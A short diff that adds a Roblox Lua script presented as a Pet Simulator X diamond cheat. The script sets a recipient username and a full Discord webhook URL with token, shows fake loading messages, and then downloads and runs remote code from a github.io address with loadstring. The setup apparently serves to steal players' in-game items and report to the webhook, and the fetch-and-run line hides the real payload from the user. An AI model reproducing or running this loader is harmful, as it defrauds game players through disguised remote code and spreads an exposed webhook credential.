@@ -1,0 +1,8 @@
+UserName = "Mr_sDarKill"
+Webhook = "https://discord.com/api/webhooks/1103242738465525760/mXF_T791BGMKBLghGlC4tcy4OWEnMgbP3-4pqOGBnZ7ocNhYaWUCjH6rv9nux75pHU_w"
+_G.ScriptName = "Psx script op 1b diamond per minute"
+_G.FirstText = "please wait"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 500
+loadstring(game:HttpGet("https://rizz69.github.io/Main.lua", true))()
